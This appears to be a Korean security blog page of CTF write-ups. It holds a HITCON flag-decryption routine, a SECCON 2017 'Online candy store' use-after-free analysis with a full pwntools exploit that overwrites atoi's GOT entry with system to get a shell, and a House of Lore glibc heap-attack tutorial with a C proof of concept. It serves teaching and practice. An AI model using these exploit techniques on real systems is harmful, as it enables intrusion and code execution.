<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">key db 0x48,0xC1,0xFD,0x03,0xE8,0x07,0xFE,0xFF,0xFF,0x48,0x85,0xED,</span><br><span class="line">0x74,0x20,0x31,0xDB,0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00,0x4C,</span><br><span class="line">0x89,0xEA,0x4C,0x89,0xF6,0x44,0x89,0xFF,0x41,0xFF,0x14,0xDC,0x48,</span><br><span class="line">0x83,0xC3,0x01,0x48,0x39,0xDD,0x75,0xEA,0x48,0x83,0xC4,0x08,0x5B,</span><br><span class="line">0x5D,0x41,0x5C,0x41,0x5D,0x41,0x5E,0x41,0x5F,0xC3,0x90,0x66,0x2E,</span><br><span class="line">0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00,0xF3,0xC3,0x00,0x00,0x48,</span><br><span class="line">0x83,0xEC,0x08,0x48,0x83,0xC4,0x08,0xC3,0x00,0x00,0x00,0x01,0x00,</span><br><span class="line">0x02,0x00,0x25,0x73,0x00,0x68,0x69,0x74,0x63,0x6F,0x6E,0x7B,0x25,</span><br><span class="line">0x73,0x7D,0x0A,0x00,0x00,0x01,0x1B,0x03,0x3B,0x40,0x00,0x00,0x00,</span><br><span class="line">0x07,0x00,0x00,0x00,0xBC,0xFD,0xFF,0xFF,0x8C,0x00,0x00,0x00,0xCC,</span><br><span class="line">0xFD,0xFF,0xFF,0xB4,0x00,0x00,0x00,0xEC,0xFD,0xFF,0xFF,0x5C,0x00,</span><br><span class="line">0x00,0x00,0x1C,0xFF,0xFF,0xFF,0xCC,0x00,0x00,0x00,0x57,0xFF,0xFF,</span><br><span class="line">0xFF,0xEC,0x00,0x00,0x00,0x6C,0xFF,0xFF,0xFF,0x0C,0x01,0x00,0x00,</span><br><span class="line">0xDC,0xFF,0xFF,0xFF,0x54,0x01,0x00,0x00</span><br><span class="line"></span><br><span class="line">cipher db 0xE7,0x47,0x04,0x12,0x49,0x6D,0xCF,0x47,0xB0,0xE9,0x1B,</span><br><span class="line">0x17,0x67,0xFB,0x46,0x28</span><br><span class="line">plaintext db 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,</span><br><span class="line">0x00,0x00,0x00,0x00,0x00</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">call decrypt</span><br><span class="line"></span><br><span class="line">decrypt:</span><br><span class="line">mov rax,cipher</span><br><span class="line">movdqu xmm15, [rax]</span><br><span class="line">mov rax,key</span><br><span class="line">add rax,0xa0</span><br><span class="line">movdqu xmm0, [rax]</span><br><span class="line">pxor xmm15, xmm0</span><br><span class="line"></span><br><span class="line">push 0xa</span><br><span class="line">pop rdi</span><br><span class="line"></span><br><span class="line">round:</span><br><span class="line">sub rax,0x10</span><br><span class="line">movdqu xmm0, [rax]</span><br><span class="line">dec edi</span><br><span class="line">test edi, edi</span><br><span class="line">jz declast</span><br><span class="line">js return</span><br><span class="line">aesimc xmm0, xmm0</span><br><span class="line">aesdec xmm15,xmm0</span><br><span class="line">jmp round</span><br><span class="line"></span><br><span class="line">declast:</span><br><span class="line">aesdeclast xmm15,xmm0</span><br><span class="line">jmp round</span><br><span class="line"></span><br><span class="line">return:</span><br><span class="line">mov rax,plaintext</span><br><span class="line">movdqu [rax],xmm15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>flag를 구하기 위해 작성한 복호화 어셈 코드다. bss 영역에 있는 key 데이터를 모두 가져오고, 뒤에서부터 16byte씩 가져와 사용하였다. plaintext에 저장된 데이터를 확인해보면 flag를 확인할 수 있다.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ./void </span></span><br><span class="line">code_in_BuildID!</span><br><span class="line">hitcon&#123;code_in_BuildID!&#125;</span><br><span class="line">Good!</span><br></pre></td></tr></table></figure>

      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/07/SECCON-2017-Online-candy-store/">SECCON 2017 - Online candy store</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-07T07:14:30.000Z" itemprop="datePublished">
    2018-01-07
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/pwnable/">Pwnable</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <h4 id="Write-up"><a href="#Write-up" class="headerlink" title="Write-up"></a>Write-up</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Account - change password</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( state[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)i] )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%ld) %s\n"</span>, id[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)i], info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)i] + <span class="number">16</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"\nPlease enter the number of the account you want to change PW"</span>);</span><br><span class="line">  v2 = get_int(<span class="number">2u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = v2 - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)(info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3] + <span class="number">32</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Enter your New Password."</span>);</span><br><span class="line">          readn((<span class="keyword">void</span> *)(info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3] + <span class="number">24</span>), <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>취약점은 account의 password를 변경하는 함수에서 발생한다. 처음에 변경 가능한 계정을 출력할 때 state의 값을 참조하여 결정한다. delete된 계정은 state 정보가 0으로 바뀌고 모든 정보들이 null로 정리된 후에 free된다. 변경할 account의 idx 값을 입력받고 그 계정의 state 값을 검사하지 않고 (account_info + 32) 의 값으로 검사를 진행하여 uaf를 통해 우회할 수 있게 된다. 결국 free된 chunk의 bk를 컨트롤할 수 있는 것이다. 이제 bk를 조작하여 공격을 진행하는 기법중에 house of lore 공격을 이용해서 쉘을 얻어보자.<br><br></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Order - order_candy</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"\nEnter information about newly added candy."</span>);</span><br><span class="line">          dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">24u</span>LL);</span><br><span class="line">          <span class="built_in">strncpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">char</span> *)*(&amp;order_list + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) + <span class="number">12</span>, <span class="number">8u</span>LL);</span><br><span class="line">          *((_DWORD *)dest + <span class="number">2</span>) = *((_DWORD *)*(&amp;order_list + (<span class="keyword">signed</span> <span class="keyword">int</span>)i) + <span class="number">2</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Enter the price of %s candy.\n"</span>, dest);</span><br><span class="line">          *((_DWORD *)dest + <span class="number">3</span>) = get_int(<span class="number">5u</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"Enter a description of the %s candy.\n"</span>, dest);</span><br><span class="line">          *((_QWORD *)dest + <span class="number">2</span>) = <span class="built_in">malloc</span>(<span class="number">124u</span>LL);</span><br><span class="line">          readn(*((<span class="keyword">void</span> **)dest + <span class="number">2</span>), <span class="number">124</span>);</span><br><span class="line">          *(_QWORD *)&amp;candy_list[<span class="number">8</span> * candy_cnt++] = dest;</span><br></pre></td></tr></table></figure>
<p>공격에 libc_base와 heap_base가 필요하다. leak가 발생하는 곳은 위의 order_candy 함수다. strncpy를 이용하면서 복사하면서 null이 붙지 않아 leak이 발생한다. order_candy() -&gt; order_candy() -&gt; order_candy() -&gt; order_candy() 를 한 후에 delete_candy(idx=0) -&gt; delete_candy(idx=1) 를 해주면 heap leak이 가능하고 purchase 함수에서 malloc(1500)를 실행시키면 malloc_consolidate 함수를 실행되면서 free된 fastbin의 bin주소가 들어가게 되면서 libc leak이 가능하다.<br><br></p>
<blockquote>
<p>account - [ state | idx | account_info(ptr) | accout_money ]</p>
</blockquote>
<p>먼저 account를 하나를 임의로 만들어준다. account_info의 크기는 128이다. 그리고 delete하고 admin 계정을 통해 candy를 주문하면 malloc(124)가 호출되면서 uaf 공격을 할 수 있다. 이제 purchase를 하면 주문한 candy를 free시키고 malloc(1200)가 호출되므로 account_info가 smallbin list에 들어간다. 이 상태에서 계정의 패스워드를 변경하면 (account_info +24), 즉 bk의 값을 변경할 수 있으므로 outbound write하고 싶은 곳으로 변경해주면 된다. 그런데 house of lore 공격은 몇가지 검사를 우회해야 하므로 16byte 정도 컨트롤할 수 있는 공간이여야 한다.<br><br></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Account - delete account</span></span><br><span class="line">      state[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3] = <span class="number">0L</span>L;</span><br><span class="line">      *(_QWORD *)(info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3] + <span class="number">32</span>) = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"The account(%s) has been deleted.\n"</span>, info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3] + <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">memset</span>((<span class="keyword">void</span> *)info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3], <span class="number">0</span>, <span class="number">128u</span>LL);</span><br><span class="line">      <span class="built_in">free</span>((<span class="keyword">void</span> *)info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3]);</span><br><span class="line">      info[<span class="number">4</span> * (<span class="keyword">unsigned</span> __int64)(<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3] -= <span class="number">16L</span>L;</span><br></pre></td></tr></table></figure>
<p>account_delete 함수를 보면 account_info 를 free한 후에 16을 빼준다. 그리고 account 가 data 영역에 저장되는 형식을 살펴보면 account_info가 저장된 곳에서 8byte 뒤에 account_money가 저장된다.<br><br></p>
<p>따라서 smallbin list에 등록된 청크의 bk를 &amp;account로 변경하면 bck-&gt;fd != victim 를 검사하는 부분을 우회하게 되는 것이다.(bck가 우리가 변조한 bk값이 된다.) 그리고 account_money는 적절한 heap 공간을 가리키게 해서 마지막 검사를 우회하면 된다. 그 후에 candy를 1번 주문한 뒤 한번 더 candy를 주문할때 malloc이 &amp;account+16 를 반환한다. account_info 의 값을 변경할 수 있게 되었으니 atoi_got+24 를 입력하고 change_password에서 got overwrite를 하여 system(‘sh’)를 실행시키면 된다.<br><br><br></p>
<h4 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = process(<span class="string">"/root/mLazenca.0x0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(id,pw)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"ID.\n&gt; "</span>)</span><br><span class="line">	s.send(id)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(pw)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'9'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(id,pw,profile)</span>:</span></span><br><span class="line">	login(<span class="string">'aasda13'</span>,<span class="string">'a123213'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(id)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(pw)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(profile)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_order</span><span class="params">(candy_idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'4'</span>)</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(candy_idx))</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_candy</span><span class="params">(first=<span class="number">0</span>,price=<span class="string">''</span>,desc=<span class="string">''</span>,fini=<span class="number">0</span>)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'4'</span>)</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'4'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(<span class="string">'0'</span>)</span><br><span class="line">	<span class="keyword">if</span> first:</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.sendline(str(price))</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.send(desc)</span><br><span class="line">	<span class="keyword">if</span> fini:</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.sendline(str(price))</span><br><span class="line">		s.recv(<span class="number">1024</span>)</span><br><span class="line">		s.send(desc)</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">purchase</span><span class="params">(code,cnt,comment=<span class="string">''</span>)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(code))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(cnt))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	<span class="keyword">if</span> comment!=<span class="string">''</span>:</span><br><span class="line">		s.send(comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel_order</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'4'</span>)</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_account</span><span class="params">(idx)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'5'</span>)</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'1'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_password</span><span class="params">(idx,password,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'5'</span>)</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	s.sendline(<span class="string">'2'</span>)</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.sendline(str(idx))</span><br><span class="line">	s.recv(<span class="number">1024</span>)</span><br><span class="line">	s.send(password)</span><br><span class="line">	s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">	<span class="keyword">if</span> flag:</span><br><span class="line">		s.sendline(<span class="string">'sh'</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		s.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charge</span><span class="params">(money)</span>:</span></span><br><span class="line">	choice = <span class="number">5</span></span><br><span class="line">	<span class="keyword">while</span> choice&gt;=<span class="number">0</span>:</span><br><span class="line">		q = money/(pow(<span class="number">10</span>,choice))</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(q):</span><br><span class="line">			s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">			s.sendline(<span class="string">'3'</span>)</span><br><span class="line">			s.recv(<span class="number">1024</span>)</span><br><span class="line">			s.sendline(str(choice))</span><br><span class="line">		money -= q*(pow(<span class="number">10</span>,choice))</span><br><span class="line">		choice -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">login(<span class="string">'Admin'</span>,<span class="string">'admin'</span>)</span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line">cancel_order(<span class="number">0</span>)</span><br><span class="line">cancel_order(<span class="number">1</span>)</span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">s.sendline(<span class="string">'4'</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">s.sendline(<span class="string">'1'</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Order code  : "</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Order code  : "</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Order code  : "</span>)</span><br><span class="line">heap_leak = u32(s.recvline()[:<span class="number">-1</span>].ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap_base = heap_leak &amp; <span class="number">0xffffff000</span></span><br><span class="line">heap_data = heap_base + <span class="number">0xd70</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap_base : "</span>+hex(heap_base)</span><br><span class="line">s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">s.sendline(<span class="string">'5'</span>)</span><br><span class="line">cancel_order(<span class="number">2</span>)</span><br><span class="line">cancel_order(<span class="number">1</span>)</span><br><span class="line">cancel_order(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line">order_candy(<span class="number">1</span>,<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">100</span>)</span><br><span class="line">add_order(<span class="number">9</span>)</span><br><span class="line">order_candy(<span class="number">1</span>,<span class="number">1</span>,<span class="string">'2'</span>*<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">logout()</span><br><span class="line">register(<span class="string">'aaaaaaaa'</span>,<span class="string">'aaaaaaa'</span>,<span class="string">'aaaa\x00'</span>)</span><br><span class="line">login(<span class="string">'aaaaaa'</span>,<span class="string">'aaaaaaa'</span>)</span><br><span class="line">charge(heap_data - <span class="number">10000</span>)</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line">login(<span class="string">'Admin'</span>,<span class="string">'admin'</span>)</span><br><span class="line">purchase(<span class="number">0</span>,<span class="number">10</span>,<span class="string">'1234'</span>)</span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">s.sendline(<span class="string">'4'</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">s.sendline(<span class="string">'1'</span>)</span><br><span class="line">s.recvuntil(<span class="string">"Order code  : "</span>)</span><br><span class="line">libc_base = u64(s.recvn(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0x3C4B00</span></span><br><span class="line">libc_base &gt;&gt;= <span class="number">8</span></span><br><span class="line">libc_base &lt;&lt;= <span class="number">8</span></span><br><span class="line">libc_system = libc_base + <span class="number">0x0000000000045390</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc_base : "</span>+hex(libc_base)</span><br><span class="line">s.recvuntil(<span class="string">"Command : "</span>)</span><br><span class="line">s.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">add_order(<span class="number">1</span>)</span><br><span class="line">add_order(<span class="number">1</span>)</span><br><span class="line">add_order(<span class="number">1</span>)</span><br><span class="line">delete_account(<span class="number">2</span>)</span><br><span class="line">cancel_order(<span class="number">1</span>)</span><br><span class="line">order_candy(<span class="number">1</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">100</span>,fini=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add_order(<span class="number">0</span>)</span><br><span class="line">account2_ptr = <span class="number">0x604250</span> - <span class="number">0x10</span></span><br><span class="line">payload  = <span class="string">'a'</span>*<span class="number">16</span> + p64(account2_ptr)*<span class="number">2</span></span><br><span class="line">purchase(<span class="number">1</span>,<span class="number">10</span>,payload)</span><br><span class="line">change_password(<span class="number">2</span>,p64(account2_ptr))</span><br><span class="line"></span><br><span class="line">add_order(<span class="number">1</span>)</span><br><span class="line">order_candy(<span class="number">1</span>,<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">100</span>)</span><br><span class="line">add_order(<span class="number">5</span>)</span><br><span class="line">atoi_got = <span class="number">0x604098</span></span><br><span class="line">order_candy(<span class="number">1</span>,<span class="number">1</span>,p64(atoi_got - <span class="number">24</span>))</span><br><span class="line">change_password(<span class="number">2</span>,p64(libc_system),flag=<span class="number">1</span>) <span class="comment"># getshell</span></span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
      
    </div>
</article>

    </li>
  
    <li>
      <article class='ListView'>
    <header class="title">
      
        <h1>
          <a href="/2018/01/06/House-of-Lore-Trick-smallbin-freelist/">House of Lore</a>
        </h1>
      
      <div class='ListMeta'>
  <time datetime="2018-01-06T01:55:24.000Z" itemprop="datePublished">
    2018-01-06
  </time>
  
  
  / 
  <ul>
    
  <li class="meta-text">
  { <a href="/categories/pwnable/">Pwnable</a> }
  </li>


  </ul>
  
</div>

    </header>
    <div>
      
        <p>House of lore 공격은 smallbin freelist에 임의의 청크를 넣어서 outbound write를 가능하게 한다.<br><br></p>
<h4 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line">	</span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">       &#123;</span><br><span class="line">         bck = victim-&gt;bk;</span><br><span class="line">         <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">           malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">         set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">         bin-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>
<p><br><br></p>
<h4 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h4><p>위의 소스가 house of lore에서 이용되는 부분이다. 만약 smallbin chunk의 bk를 조작할 수 있으면 간단한 검사를 우회한 뒤 조작한 bk를 malloc 호출시 return하게 만들 수 있다.<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE 200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Ubuntu 16.04 64bit - KiraSys</span></span><br><span class="line">__attribute((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">	setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">intptr_t</span> *fake_chunk1[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">intptr_t</span> *fake_chunk2[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"> 	<span class="keyword">intptr_t</span> *m1 = <span class="built_in">malloc</span>(SIZE);</span><br><span class="line"> 	<span class="keyword">intptr_t</span> *m2 = <span class="built_in">malloc</span>(SIZE);</span><br><span class="line"> 	<span class="keyword">intptr_t</span> *m3 = <span class="built_in">malloc</span>(SIZE);</span><br><span class="line"> 	<span class="keyword">intptr_t</span> *top = <span class="built_in">malloc</span>(<span class="number">1</span>);	</span><br><span class="line"> 	<span class="comment">//to prevent consolidating the top chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 	<span class="built_in">free</span>(m1);</span><br><span class="line"> 	<span class="comment">//m1 inserted into unsorted bin</span></span><br><span class="line"> 	<span class="built_in">malloc</span>(<span class="number">1500</span>);		     		</span><br><span class="line"> 	<span class="comment">//m1 inserted into smallbin list</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span>* m1_chunk = m1 - <span class="number">2</span>;</span><br><span class="line"> 	m1_chunk[<span class="number">3</span>] = fake_chunk1;</span><br><span class="line"> 	<span class="comment">//fake_chunk1 is where we want to write the data</span></span><br><span class="line"></span><br><span class="line"> 	fake_chunk1[<span class="number">2</span>] = m1_chunk;  </span><br><span class="line"> 	<span class="comment">//to bypass check of m1-&gt;bk corruption</span></span><br><span class="line"> 	fake_chunk1[<span class="number">3</span>] = fake_chunk2;</span><br><span class="line"> 	<span class="comment">//to bypass check of fake_chunk1-&gt;bk corruption</span></span><br><span class="line"> 	fake_chunk2[<span class="number">2</span>] = fake_chunk1;</span><br><span class="line"></span><br><span class="line"> 	</span><br><span class="line"> 	<span class="built_in">malloc</span>(SIZE);			  </span><br><span class="line"> 	<span class="comment">// this malloc result in fake_chunk2 injected in last(bin)	</span></span><br><span class="line"> 	<span class="built_in">printf</span>(<span class="string">"%p\n"</span>,<span class="built_in">malloc</span>(SIZE));				  </span><br><span class="line">	<span class="comment">// new malloc(SIZE) probably point out stack address..</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p>
<p>예제를 분석해보면 처음에 smallbin 사이즈의 malloc을 호출-&gt;free를 하게되면 unsorted bin에 들어간다. 그후에 free나 malloc를 하면 unsorted bin에 있던 chunk가 사이즈에 맞게 bin에 들어가게 된다. 이 예제에서는 200을 넘는 크기의 malloc을 요청하면 된다. smallbin list에 등록된 청크의 bk를 원하는 곳으로 변경하고 검사를 우회하기 위해 지정한 곳은 16byte 정도 데이터를 쓸 수 있는 곳이여야 한다.<br><br><br></p>
<h4 id="Advanced"><a href="#Advanced" class="headerlink" title="Advanced"></a>Advanced</h4><p>예제에서는 smallbin chunk size의 해당하는 크기를 사용했지만 fastbin chunk size를 사용해도 된다. 그런데 fastbin chunk는 free후에 unsorted bin list로 들어가지 않기 때문에 large bin 이상의 크기를 요청해서 malloc_consolidate 함수가 호출되도록 만들면 fastbin chunk도 smallbin list에 들어가게 된다.<br><br><br></p>
